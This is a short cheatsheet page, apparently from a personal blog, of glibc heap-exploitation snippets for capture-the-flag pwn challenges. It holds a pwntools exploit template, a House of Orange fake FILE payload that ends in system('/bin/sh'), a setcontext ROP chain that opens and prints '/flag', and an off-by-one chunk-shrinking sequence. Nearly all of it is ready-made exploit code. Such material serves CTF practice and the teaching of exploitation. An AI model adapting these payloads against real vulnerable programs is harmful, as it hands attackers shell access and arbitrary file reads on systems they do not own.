---
layout: page
title: cheatsheet
permalink: /cheatsheet/
---

# PwntoolsExp
```sh
echo "from pwn import *" > exp.py
echo "context.log_level='debug'" >> exp.py
echo "context.arch='amd64'" >> exp.py
echo "context.terminal=['tmux','split','-h']" >> exp.py
echo "p=process('./pwn')" >> exp.py
echo "gdb.attach(p)">> exp.py
echo "p.interactive()">> exp.py
```
# House of Orange
```python
fio=0#fake io_file addr
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
```
# Setcontext(RDI)
```python

context.arch='amd64'#"i386"
sys=libc.sym["getpid"]+5
leave=libc.sym['strfromf128']-0x51d
# RSP -> gadget of 'leave ret'
# Set __free_hook+8 ->leave is a good choice
rsp=libc.sym['__free_hook']+8
rdi=0
rsi=0x200+libc.sym['__free_hook']
rdx=0x200
rbp=rsi-8
rcx=sys
setcontext='\0'*0x68+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])#len=22*8
######################P2################################
rax=base+gadget['rax']
rdi=base+gadget['rdi']
rsi=base+gadget['rsi']
rdx=base+gadget['rdx']
filename_addr=libc.sym['__free_hook']+0x200+23*8
buf=libc.sym['__free_hook']+0x100

payload = flat([rax,2,rdi,filename_addr,rsi,0,rdx,0,sys])
payload += flat([rax,0,rdi,3,rsi,buf,rdx,0x50,sys])
payload += flat([rax,1,rdi,1,sys])+'/flag\0'
```
# Setcontext(RDX)
`getkeyserv_handle+576`
`searchmem 0x2404894808578b48`
# OffByOne Shrinke
```python
add(0x400)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0x18,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
```